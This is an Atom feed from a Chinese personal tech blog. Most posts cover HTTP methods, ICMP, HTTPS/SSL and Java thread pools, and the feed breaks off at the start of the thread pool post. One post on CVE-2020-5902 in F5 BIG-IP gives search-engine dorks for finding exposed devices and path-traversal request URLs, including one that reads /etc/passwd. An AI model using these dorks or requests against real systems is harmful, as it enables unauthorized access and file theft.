<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-07-06T15:10:16+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">lazycat</title><subtitle>lazycat&lt;br/&gt;
&lt;a href=&quot;mailto:verylazycat@outlook.com&quot;&gt;
  &lt;i class=&quot;fas fa-envelope&quot;&gt;&lt;/i&gt;
&lt;/a&gt;
&lt;a href=&quot;https://github.com/verylazycat&quot;&gt;
  &lt;i class=&quot;fab fa-github&quot;&gt;&lt;/i&gt;
&lt;/a&gt;
</subtitle><entry><title type="html">cve-2020-5902</title><link href="http://localhost:4000/_posts/2020-07-06-cve-2020-5902/" rel="alternate" type="text/html" title="cve-2020-5902" /><published>2020-07-06T00:00:00+08:00</published><updated>2020-07-06T00:00:00+08:00</updated><id>http://localhost:4000/_posts/cve-2020-5902</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-06-cve-2020-5902/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;code&gt;警告,用于学习,切勿做破坏,造成的后果本人概不负责&lt;/code&gt;&lt;/em&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;2020年07月03日， 360CERT监测发现 &lt;code&gt;F5&lt;/code&gt; 发布了 &lt;code&gt;F5 BIG-IP 远程代码执行&lt;/code&gt; 的风险通告，该漏洞编号为 &lt;code&gt;CVE-2020-5902&lt;/code&gt;，漏洞等级：&lt;code&gt;严重&lt;/code&gt;。&lt;/p&gt;

  &lt;p&gt;未授权的远程攻击者通过向漏洞页面发送特制的请求包，可以造成任意 Java 代码执行。进而控制 &lt;code&gt;F5 BIG-IP&lt;/code&gt; 的全部功能，包括但不限于: 执行任意系统命令、开启/禁用服务、创建/删除服务器端文件等。该漏洞影响控制面板受影响，不影响数据面板。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;漏洞详情&quot;&gt;漏洞详情&lt;/h1&gt;

&lt;p&gt;&lt;code&gt;F5 BIG-IP&lt;/code&gt; 是美国&lt;code&gt;F5&lt;/code&gt;公司一款集成流量管理、DNS、出入站规则、web应用防火墙、web网关、负载均衡等功能的应用交付平台。&lt;/p&gt;

&lt;p&gt;在 &lt;code&gt;F5 BIG-IP&lt;/code&gt; 产品的流量管理用户页面 (TMUI)/配置实用程序的特定页面中存在一处远程代码执行漏洞。&lt;/p&gt;

&lt;h1 id=&quot;影响版本&quot;&gt;影响版本&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;BIG-IP 15.x: 15.1.0/15.0.0&lt;/li&gt;
  &lt;li&gt;BIG-IP 14.x: 14.1.0 ~ 14.1.2&lt;/li&gt;
  &lt;li&gt;BIG-IP 13.x: 13.1.0 ~ 13.1.3&lt;/li&gt;
  &lt;li&gt;BIG-IP 12.x: 12.1.0 ~ 12.1.5&lt;/li&gt;
  &lt;li&gt;BIG-IP 11.x: 11.6.1 ~ 11.6.5&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;修复建议&quot;&gt;修复建议&lt;/h1&gt;

&lt;p&gt;升级到以下版本&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;BIG-IP 15.x: 15.1.0.4&lt;/li&gt;
  &lt;li&gt;BIG-IP 14.x: 14.1.2.6&lt;/li&gt;
  &lt;li&gt;BIG-IP 13.x: 13.1.3.4&lt;/li&gt;
  &lt;li&gt;BIG-IP 12.x: 12.1.5.2&lt;/li&gt;
  &lt;li&gt;BIG-IP 11.x: 11.6.5.2&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;目标搜索&quot;&gt;目标搜索&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;注：请将下面的%26替换为&amp;amp;&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;shodan&lt;/strong&gt;
 http.favicon.hash:-335242539&lt;/p&gt;

  &lt;p&gt;http.title:”BIG-IP%26reg;- Redirect”&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;fofa&lt;/strong&gt;
 title=”BIG-IP%26reg;- Redirect”&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;censys&lt;/strong&gt;
 443.https.get.body_sha256:5d78eb6fa93b995f9a39f90b6fb32f016e80dbcda8eb71a17994678692585ee5&lt;/p&gt;

  &lt;p&gt;443.https.get.title:”BIG-IP%26reg;- Redirect”&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;google&lt;/strong&gt;
 inurl:”tmui/login.jsp”&lt;/p&gt;

  &lt;p&gt;intitle:”BIG-IP” inurl:”tmui”&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;漏洞检测&quot;&gt;漏洞检测&lt;/h1&gt;

&lt;pre&gt;&lt;code class=&quot;language-http&quot;&gt;/tmui/login.jsp/..;/tmui/system/user/authproperties.jsp
/tmui/login.jsp/..;/tmui/util/getTabSet.jsp?tabId=a
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;利用&quot;&gt;利用&lt;/h1&gt;

&lt;pre&gt;&lt;code class=&quot;language-http&quot;&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry><entry><title type="html">HTTP请求方法</title><link href="http://localhost:4000/_posts/2020-07-05-HTTP%E5%8D%8F%E8%AE%AE%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/" rel="alternate" type="text/html" title="HTTP请求方法" /><published>2020-07-05T00:00:00+08:00</published><updated>2020-07-05T00:00:00+08:00</updated><id>http://localhost:4000/_posts/HTTP%E5%8D%8F%E8%AE%AE%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-05-HTTP%E5%8D%8F%E8%AE%AE%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Http定义了与服务器交互的不同方法，最基本的方法有4种，分别是GET，POST，PUT，DELETE。URL全称是资源描述符，我们可以这样认为：一个URL地址，它用于描述一个网络上的资源，而HTTP中的GET，POST，PUT，DELETE就对应着对这个资源的查，改，增，删4个操作。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;主要方法&quot;&gt;主要方法&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;GET： 请求指定的页面信息，并返回实体主体。&lt;/li&gt;
  &lt;li&gt;HEAD： 只请求页面的首部。&lt;/li&gt;
  &lt;li&gt;POST： 请求服务器接受所指定的文档作为对所标识的URI的新的从属实体。&lt;/li&gt;
  &lt;li&gt;PUT： 从客户端向服务器传送的数据取代指定的文档的内容。&lt;/li&gt;
  &lt;li&gt;DELETE： 请求服务器删除指定的页面。&lt;/li&gt;
  &lt;li&gt;OPTIONS： 允许客户端查看服务器的性能。&lt;/li&gt;
  &lt;li&gt;TRACE： 请求服务器在响应中的实体主体部分返回所得到的内容。&lt;/li&gt;
  &lt;li&gt;PATCH： 实体中包含一个表，表中说明与该URI所表示的原内容的区别。&lt;/li&gt;
  &lt;li&gt;MOVE： 请求服务器将指定的页面移至另一个网络地址。&lt;/li&gt;
  &lt;li&gt;COPY： 请求服务器将指定的页面拷贝至另一个网络地址。&lt;/li&gt;
  &lt;li&gt;LINK： 请求服务器建立链接关系。&lt;/li&gt;
  &lt;li&gt;UNLINK： 断开链接关系。&lt;/li&gt;
  &lt;li&gt;WRAPPED： 允许客户端发送经过封装的请求。&lt;/li&gt;
  &lt;li&gt;Extension-mothed：在不改动协议的前提下，可增加另外的方法&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;get请求&quot;&gt;GET请求&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;根据HTTP规范，GET用于信息获取，而且应该是&lt;code&gt;安全的&lt;/code&gt;和&lt;code&gt;幂等的&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;所谓安全的意味着该操作用于获取信息而非修改信息。换句话说，GET 请求一般不应产生副作用。就是说，它仅仅是获取资源信息，就像数据库查询一样，不会修改，增加数据，不会影响资源的状态&lt;/p&gt;

&lt;p&gt;幂等的意味着对同一URL的多个请求应该返回同样的结果。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;幂等&lt;/strong&gt;是一个数学或计算机学概念，常见于抽象代数中&lt;/p&gt;

  &lt;p&gt;对于单目运算，如果一个运算对于在范围内的所有的一个数多次进行该运算所得的结果和进行一次该运算所得的结果是一样的，那么我们就称该运算是幂等的。比如绝对值运算就是一个例子，在实数集中，有abs(a)=abs(abs(a))。对于双目运算，则要求当参与运算的两个值是等值的情况下，如果满足运算结果与参与运算的两个值相等，则称该运算幂等，如求两个数的最大值的函数，有在在实数集中幂等，即max(x,x) = x。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;post请求&quot;&gt;POST请求&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;根据HTTP规范，POST表示可能修改变服务器上的资源的请求&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;get和post区别&quot;&gt;get和post区别&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;GET在浏览器回退时是无害的，而POST会再次提交请求。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;GET产生的URL地址可以被Bookmark，而POST不可以。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;GET请求会被浏览器主动cache，而POST不会，除非手动设置。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;GET请求只能进行url编码，而POST支持多种编码方式。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;GET请求在URL中传送的参数是有长度限制的，而POST么有。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;对参数的数据类型，GET只接受ASCII字符，而POST没有限制。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;GET参数通过URL传递，POST放在Request body中&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;　&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;GET请求的数据会附在URL之后（就是把数据放置在HTTP协议头中），以?分割URL和传输数据，参数之间以&amp;amp;相连，如：login.action?name=hyddd&amp;amp;password=idontknow&amp;amp;verify=%E4%BD%A0%E5%A5%BD。如果数据是英文字母/数字，原样发送，如果是空格，转换为+，如果是中文/其他字符，则直接把字符串用BASE64加密，得出如：%E4%BD%A0%E5%A5%BD，其中％XX中的XX为该符号以16进制表示的ASCII。
POST把提交的数据则放置在是HTTP包的包体中
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;理论上讲，POST是没有大小限制的，HTTP协议规范也没有进行大小限制
POST的安全性要比GET的安全性高。注意：这里所说的安全性和上面GET提到的“安全”不是同个概念。上面“安全”的含义仅仅是不作数据修改，而这里安全的含义是真正的Security的含义，比如：通过GET提交数据，用户名和密码将明文出现在URL上，因为(1)登录页面有可能被浏览器缓存，(2)其他人查看浏览器的历史纪录，那么别人就可以拿到你的账号和密码了，除此之外，使用GET提交数据还可能会造成Cross-site request forgery攻击。
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;总结一下，Get是向服务器发索取数据的一种请求，而Post是向服务器提交数据的一种请求，在FORM（表单）中，Method默认为&quot;GET&quot;，实质上，GET和POST只是发送机制不同，并不是一个取一个发
&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="计算机网络" /><summary type="html">[toc]</summary></entry><entry><title type="html">ICMP协议和ping命令</title><link href="http://localhost:4000/_posts/2020-07-05-ICMP%E5%8D%8F%E8%AE%AE%E5%92%8Cping%E5%91%BD%E4%BB%A4/" rel="alternate" type="text/html" title="ICMP协议和ping命令" /><published>2020-07-05T00:00:00+08:00</published><updated>2020-07-05T00:00:00+08:00</updated><id>http://localhost:4000/_posts/ICMP%E5%8D%8F%E8%AE%AE%E5%92%8Cping%E5%91%BD%E4%BB%A4</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-05-ICMP%E5%8D%8F%E8%AE%AE%E5%92%8Cping%E5%91%BD%E4%BB%A4/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;p&gt;ICMP全称Internet Control Message Protocol，就是&lt;strong&gt;互联网控制报文协议&lt;/strong&gt;。
 ICMP 报文是封装在 IP 包里面的。因为传输指令的时候，肯定需要&lt;strong&gt;源地址&lt;/strong&gt;和&lt;strong&gt;目标地址&lt;/strong&gt;。它本身非常简单。因为作为侦查兵，要轻装上阵，不能携带大量的包袱&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/home/admin233/博客/verylazycat.github.io/img/ICMP&amp;amp;ping.png&quot; alt=&quot;ICMP&amp;amp;ping&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;ICMP 报文有很多的类型，不同的类型有不同的代码。最常用的类型是主动请求为 8，主动请求的应答为0&lt;/p&gt;
&lt;/blockquote&gt;</content><author><name></name></author><category term="计算机网络" /><summary type="html">[toc]</summary></entry><entry><title type="html">HTTP和HTTPS</title><link href="http://localhost:4000/_posts/2020-07-04-HTTP%E5%92%8CHTTPS/" rel="alternate" type="text/html" title="HTTP和HTTPS" /><published>2020-07-04T00:00:00+08:00</published><updated>2020-07-04T00:00:00+08:00</updated><id>http://localhost:4000/_posts/HTTP%E5%92%8CHTTPS</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-04-HTTP%E5%92%8CHTTPS/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;h1 id=&quot;http和https的基本概念&quot;&gt;&lt;strong&gt;Http和Https的基本概念&lt;/strong&gt;&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;Http：超文本传输协议（Http，HyperText Transfer Protocol)是互联网上应用最为广泛的一种网络协议。设计Http最初的目的是为了提供一种发布和接收HTML页面的方法。它可以使浏览器更加高效。Http协议是以明文方式发送信息的，如果黑客截取了Web浏览器和服务器之间的传输报文，就可以直接获得其中的信息&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;http原理&quot;&gt;&lt;strong&gt;Http原理&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;① 客户端的浏览器首先要通过网络与服务器建立连接，该连接是通过TCP 来完成的，一般 TCP 连接的端口号是80。 建立连接后，客户机发送一个请求给服务器，请求方式的格式为：统一资源标识符（URL）、协议版本号，后边是 MIME 信息包括请求修饰符、客户机信息和许可内容。&lt;/p&gt;

&lt;p&gt;② 服务器接到请求后，给予相应的响应信息，其格式为一个状态行，包括信息的协议版本号、一个成功或错误的代码，后边是 MIME 信息包括服务器信息、实体信息和可能的内容&lt;/p&gt;

&lt;h2 id=&quot;https&quot;&gt;Https&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;是以安全为目标的Http通道，是Http的安全版。Https的安全基础是SSL。SSL协议位于TCP/IP协议与各种应用层协议之间，为数据通讯提供安全支持。&lt;/code&gt;SSL协议可分为两层：SSL记录协议（SSL Record Protocol），&lt;code&gt;它建立在可靠的传输协议&lt;/code&gt;（如TCP）之上，为高层协议提供数据封装、压缩、加密等基本功能的支持。&lt;code&gt;SSL握手协议（SSL Handshake Protocol）&lt;/code&gt;，它建立在SSL记录协议之上，用于在实际的数据传输开始前，通讯双方进行身份认证、协商加密算法、交换加密密钥等。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/SSL.png&quot; alt=&quot;SSL&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;https设计目标&quot;&gt;&lt;strong&gt;Https设计目标&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;(1)数据保密性：保证数据内容在传输的过程中不会被第三方查看。就像快递员传递包裹一样，都进行了封装，别人无法获知里面装了什么  。&lt;/p&gt;

&lt;p&gt;(2)数据完整性：及时发现被第三方篡改的传输内容。就像快递员虽然不知道包裹里装了什么东西，但他有可能中途掉包，数据完整性就是指如果被掉包，我们能轻松发现并拒收 。&lt;/p&gt;

&lt;p&gt;(3)身份校验安全性：保证数据到达用户期望的目的地。就像我们邮寄包裹时，虽然是一个封装好的未掉包的包裹，但必须确定这个包裹不会送错地方，通过身份校验来确保送对了地方  。&lt;/p&gt;

&lt;h1 id=&quot;https原理&quot;&gt;&lt;strong&gt;Https原理&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;① 客户端将它所支持的算法列表和一个用作产生密钥的随机数发送给服务器；&lt;/p&gt;

&lt;p&gt;② 服务器从算法列表中选择一种加密算法，并将它和一份包含服务器公用密钥的证书发送给客户端；该证书还包含了用于认证目的的服务器标识，服务器同时还提供了一个用作产生密钥的随机数；&lt;/p&gt;

&lt;p&gt;③ 客户端对服务器的证书进行验证（有关验证证书，可以参考数字签名），并抽取服务器的公用密钥；然后，再产生一个称作 pre_master_secret 的随机密码串，并使用服务器的公用密钥对其进行加密（参考非对称加 / 解密），并将加密后的信息发送给服务器；&lt;/p&gt;

&lt;p&gt;④ 客户端与服务器端根据 pre_master_secret 以及客户端与服务器的随机数值独立计算出加密和 MAC密钥（参考 DH密钥交换算法） ；&lt;/p&gt;

&lt;p&gt;⑤ 客户端将所有握手消息的 MAC 值发送给服务器；&lt;/p&gt;

&lt;p&gt;⑥ 服务器将所有握手消息的 MAC 值发送给客户端。&lt;/p&gt;

&lt;h1 id=&quot;http与https的区别&quot;&gt;&lt;strong&gt;Http与Https的区别&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;1、https协议需要到CA  （Certificate Authority，证书颁发机构）申请证书，一般免费证书较少，因而需要一定费用。(原来网易官网是http，而网易邮箱是https。)&lt;/p&gt;

&lt;p&gt;2、http是超文本传输协议，信息是明文传输，https则是具有安全性的ssl加密传输协议。&lt;/p&gt;

&lt;p&gt;3、http和https使用的是完全不同的连接方式，用的端口也不一样，前者是80，后者是443。&lt;/p&gt;

&lt;p&gt;4、http的连接很简单，是无状态的。Https协议是由SSL+Http协议构建的可进行加密传输、身份认证的网络协议，比http协议安全。(无状态的意思是其数据包的发送、传输和接收都是相互独立的。无连接的意思是指通信双方都不长久的维持对方的任何信息。)&lt;/p&gt;

&lt;h1 id=&quot;https相对于http的改进&quot;&gt;&lt;strong&gt;Https相对于Http的改进&lt;/strong&gt;&lt;/h1&gt;

&lt;h2 id=&quot;双向的身份认证&quot;&gt;双向的身份认证&lt;/h2&gt;

&lt;p&gt;客户端和服务端在传输数据之前,会通过基于X.509证书对双方进行身份认证 。具体过程如下：&lt;/p&gt;

&lt;p&gt;客户端发起 SSL 握手消息给服务端要求连接。&lt;/p&gt;

&lt;p&gt;服务端将证书发送给客户端。&lt;/p&gt;

&lt;p&gt;客户端检查服务端证书，确认是否由自己信任的证书签发机构签发。 如果不是，将是否继续通讯的决定权交给用户选择 ( 注意，这里将是一个安全缺陷 )。如果检查无误或者用户选择继续，则客户端认可服务端的身份。&lt;/p&gt;

&lt;p&gt;服务端要求客户端发送证书，并检查是否通过验证。失败则关闭连接，认证成功则从客户端证书中获得客户端的公钥，一般为1024位或者 2048位。到此，服务器客户端双方的身份认证结束，双方确保身份都是真实可靠的。&lt;/p&gt;

&lt;h2 id=&quot;数据传输的机密性&quot;&gt;数据传输的机密性&lt;/h2&gt;

&lt;p&gt;客户端和服务端在开始传输数据之前，会协商传输过程需要使用的加密算法。 客户端发送协商请求给服务端, 其中包含自己支持的非对成加密的密钥交换算法 ( 一般是RSA), 数据签名摘要算法 ( 一般是SHA或者MD5) , 加密传输数据的对称加密算法 ( 一般是DES),以及加密密钥的长度。 服务端接收到消息之后，选中安全性最高的算法，并将选中的算法发送给客户端，完成协商。客户端生成随机的字符串，通过协商好的非对称加密算法，使用服务端的公钥对该字符串进行加密，发送给服务端。 服务端接收到之后，使用自己的私钥解密得到该字符串。在随后的数据传输当中，使用这个字符串作为密钥进行对称加密。&lt;/p&gt;

&lt;h2 id=&quot;防止重放攻击&quot;&gt;防止重放攻击&lt;/h2&gt;

&lt;p&gt;SSL使用序列号来保护通讯方免受报文重放攻击。这个序列号被加密后作为数据包的负载。在整个SSL握手中,都有一个唯一的随机数来标记SSL握手。 这样防止了攻击者嗅探整个登录过程，获取到加密的登录数据之后，不对数据进行解密, 而直接重传登录数据包的攻击手法。&lt;/p&gt;

&lt;p&gt;可以看到，鉴于电子商务等安全上的需求，Https对比Http协议，在安全方面已经取得了极大的增强。总结来说，Https的改进点在于创造性的使用了非对称加密算法，在不安全的网路上，安全的传输了用来进行非对称加密的密钥，综合利用了非对称加密的安全性和对称加密的快速性。&lt;/p&gt;

&lt;h1 id=&quot;https的优点&quot;&gt;&lt;strong&gt;Https的优点&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;1、使用Https协议可认证用户和服务器，确保数据发送到正确的客户机和服务器。&lt;/p&gt;

&lt;p&gt;2、Https协议是由SSL+Http协议构建的可进行加密传输、身份认证的网络协议，要比http协议安全，可防止数据在传输过程中不被窃取、修改，确保数据的完整性。&lt;/p&gt;

&lt;p&gt;3、Https是现行架构下最安全的解决方案，虽然不是绝对安全，但它大幅增加了中间人攻击的成本。&lt;/p&gt;

&lt;h1 id=&quot;https的缺点&quot;&gt;&lt;strong&gt;Https的缺点&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;1、Https协议握手阶段比较费时，会使页面的加载时间延长近。&lt;/p&gt;

&lt;p&gt;2、Https连接缓存不如Http高效，会增加数据开销，甚至已有的安全措施也会因此而受到影响。&lt;/p&gt;

&lt;p&gt;3、Https协议的安全是有范围的，在黑客攻击、拒绝服务攻击和服务器劫持等方面几乎起不到什么作用。&lt;/p&gt;

&lt;p&gt;4、SSL证书通常需要绑定IP，不能在同一IP上绑定多个域名，IPv4资源不可能支撑这个消耗。&lt;/p&gt;

&lt;p&gt;5、成本增加。部署 Https后，因为 Https协议的工作要增加额外的计算资源消耗，例如 SSL 协议加密算法和 SSL 交互次数将占用一定的计算资源和服务器成本。&lt;/p&gt;

&lt;p&gt;6、Https协议的加密范围也比较有限。最关键的，SSL证书的信用链体系并不安全，特别是在某些国家可以控制CA根证书的情况下，中间人攻击一样可行。&lt;/p&gt;

&lt;h1 id=&quot;https的连接过程&quot;&gt;&lt;strong&gt;Https的连接过程&lt;/strong&gt;&lt;/h1&gt;

&lt;h1&gt;&lt;img src=&quot;/img/https.png&quot; alt=&quot;https&quot; /&gt;&lt;/h1&gt;

&lt;p&gt;①客户端的浏览器向服务器发送请求，并传送客户端SSL 协议的版本号，加密算法的种类，产生的随机数，以及其他服务器和客户端之间通讯所需要的各种信息。&lt;/p&gt;

&lt;p&gt;②服务器向客户端传送SSL 协议的版本号，加密算法的种类，随机数以及其他相关信息，同时服务器还将向客户端传送自己的证书。&lt;/p&gt;

&lt;p&gt;③客户端利用服务器传过来的信息验证服务器的合法性，服务器的合法性包括：证书是否过期，发行服务器证书的CA 是否可靠，发行者证书的公钥能否正确解开服务器证书的“发行者的数字签名”，服务器证书上的域名是否和服务器的实际域名相匹配。如果合法性验证没有通过，通讯将断开；如果合法性验证通过，将继续进行第四步。&lt;/p&gt;

&lt;p&gt;④用户端随机产生一个用于通讯的“对称密码”，然后用服务器的公钥（服务器的公钥从步骤②中的服务器的证书中获得）对其加密，然后将加密后的“预主密码”传给服务器。&lt;/p&gt;

&lt;p&gt;⑤如果服务器要求客户的身份认证（在握手过程中为可选），用户可以建立一个随机数然后对其进行数据签名，将这个含有签名的随机数和客户自己的证书以及加密过的“预主密码”一起传给服务器。&lt;/p&gt;

&lt;p&gt;⑥如果服务器要求客户的身份认证，服务器必须检验客户证书和签名随机数的合法性，具体的合法性验证过程包括：客户的证书使用日期是否有效，为客户提供证书的CA 是否可靠，发行CA 的公钥能否正确解开客户证书的发行CA 的数字签名，检查客户的证书是否在证书废止列表（CRL）中。检验如果没有通过，通讯立刻中断；如果验证通过，服务器将用自己的私钥解开加密的“预主密码”，然后执行一系列步骤来产生主通讯密码（客户端也将通过同样的方法产生相同的主通讯密码）。&lt;/p&gt;

&lt;p&gt;⑦服务器和客户端用相同的主密码即“通话密码”，一个对称密钥用于SSL 协议的安全数据通讯的加解密通讯。同时在SSL 通讯过程中还要完成数据通讯的完整性，防止数据通讯中的任何变化。&lt;/p&gt;

&lt;p&gt;⑧客户端向服务器端发出信息，指明后面的数据通讯将使用的步骤⑦中的主密码为对称密钥，同时通知服务器客户端的握手过程结束。&lt;/p&gt;

&lt;p&gt;⑨服务器向客户端发出信息，指明后面的数据通讯将使用的步骤⑦中的主密码为对称密钥，同时通知客户端服务器端的握手过程结束。&lt;/p&gt;

&lt;p&gt;⑩SSL 的握手部分结束，SSL 安全通道的数据通讯开始，客户和服务器开始使用相同的对称密钥进行数据通讯，同时进行通讯完整性的检验。&lt;/p&gt;

&lt;h1 id=&quot;ssl提供服务&quot;&gt;&lt;strong&gt;SSL提供服务&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;(1)认证用户和服务器，确保数据发送到正确的&lt;a href=&quot;https://baike.baidu.com/item/客户机&quot;&gt;客户机&lt;/a&gt;和&lt;a href=&quot;https://baike.baidu.com/item/服务器&quot;&gt;服务器&lt;/a&gt;；&lt;/p&gt;

&lt;p&gt;(2)加密数据以防止数据中途被窃取；&lt;/p&gt;

&lt;p&gt;(3)维护数据的完整性，确保数据在传输过程中不被改变。&lt;/p&gt;

&lt;h1 id=&quot;ssl工作流程&quot;&gt;&lt;strong&gt;SSL工作流程&lt;/strong&gt;&lt;/h1&gt;

&lt;h2 id=&quot;服务器认证阶段&quot;&gt;服务器认证阶段&lt;/h2&gt;

&lt;p&gt;(1)客户端向服务器发送一个开始信息“Hello”以便开始一个新的会话连接；&lt;/p&gt;

&lt;p&gt;(2)服务器根据客户的信息确定是否需要生成新的主密钥，如需要则服务器在响应客户的“Hello”信息时将包含生成主密钥所需的信息；&lt;/p&gt;

&lt;p&gt;(3)客户根据收到的服务器响应信息，产生一个主密钥，并用服务器的公开密钥加密后传给服务器；&lt;/p&gt;

&lt;p&gt;(4)服务器回复该主密钥，并返回给客户一个用主密钥认证的信息，以此让客户认证服务器。&lt;/p&gt;

&lt;h2 id=&quot;用户认证阶段&quot;&gt;用户认证阶段&lt;/h2&gt;

&lt;p&gt;在此之前，服务器已经通过了客户认证，这一阶段主要完成对客户的认证。经认证的服务器发送一个提问给客户，客户则返回（数字）签名后的提问和其公开密钥，从而向服务器提供认证。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;SSL协议提供的安全通道有以下三个特性：&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;机密性：&lt;/strong&gt;SSL协议使用密钥加密通信数据。&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;可靠性：&lt;/strong&gt;服务器和客户都会被认证，客户的认证是可选的。&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;完整性：&lt;/strong&gt;SSL协议会对传送的数据进行完整性检查&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;服务器证书(server certificates)是SSL数字证书的一种形式，意指通过提交数字证书来证明您的身份或表明您有权访问在线服务。再者简单来说，通过使用服务器证书可为不同站点提供身份鉴定并保证该站点拥有高强度加密安全。是组成Web服务器的SSL安全功能的唯一的数字标识。通过相互信任的第三方组织获得，并为用户 提供验证您Web站点身份的手段。服务器证书包含详细的身份验证信息，如服务器内容附属的组织、颁发证书的组织以及称为公开密钥的唯一的身份验证文件&lt;/p&gt;
&lt;/blockquote&gt;</content><author><name></name></author><category term="计算机网络" /><summary type="html">[toc]</summary></entry><entry><title type="html">JAVA线程池</title><link href="http://localhost:4000/_posts/2020-07-02-JAVA%E7%BA%BF%E7%A8%8B%E6%B1%A0/" rel="alternate" type="text/html" title="JAVA线程池" /><published>2020-07-02T00:00:00+08:00</published><updated>2020-07-02T00:00:00+08:00</updated><id>http://localhost:4000/_posts/JAVA%E7%BA%BF%E7%A8%8B%E6%B1%A0</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-02-JAVA%E7%BA%BF%E7%A8%8B%E6%B1%A0/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;如果并发的线程数量很多，并且每个线程都是执行一个时间很短的任务就结束了，这样频繁创建线程就会大大降低系统的效率，因为频繁创建线程和销毁线程需要时间。那么有没有一种办法使得线程可以复用，就是执行完一个任务，并不被销毁，而是可以继续执行其他的任务？在Java中可以通过线程池来达到这样的效果&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;threadpoolexecutor类&quot;&gt;ThreadPoolExecutor类&lt;/h1&gt;

&lt;p&gt;&lt;code&gt;java.uitl.concurrent.ThreadPoolExecutor&lt;/code&gt;类是线程池中最核心的一个类，因此如果要透彻地了解Java中的线程池，必须先了解这个类。具体实现源码,在ThreadPoolExecutor类中提供了四个构造方法：&lt;/p&gt;

